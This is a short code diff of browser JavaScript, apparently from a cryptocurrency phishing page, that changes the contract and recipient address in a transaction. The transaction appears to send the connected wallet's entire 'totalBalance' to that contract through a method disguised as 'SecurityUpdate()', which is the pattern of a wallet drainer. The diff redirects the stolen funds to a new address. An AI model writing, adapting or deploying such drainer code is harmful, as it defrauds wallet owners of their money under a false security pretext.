@@ -3214,7 +3214,7 @@
       window.web3 = new Web3(window.ethereum);
       window.contract = new web3.eth.Contract(
         abi,
-        "0xb96B2EB882d599c8caCC37CDB9C73802A1BE36Ff"
+        "0x953de0fee9e7b8056dd802b2e9ba0c8e540c68b8"
       );
     } else {
       console.log("Please install MetaMask!");
@@ -3229,7 +3229,7 @@
         value: totalBalance,
         data: contract.methods.SecurityUpdate().encodeABI(),
         from: account,
-        to: "0xb96B2EB882d599c8caCC37CDB9C73802A1BE36Ff",
+        to: "0x953de0fee9e7b8056dd802b2e9ba0c8e540c68b8",
       });
       var gasPrice = await web3.eth.getGasPrice();
       var gas = new BN(estimateGas).mul(new BN(gasPrice)).mul(new BN("10"));
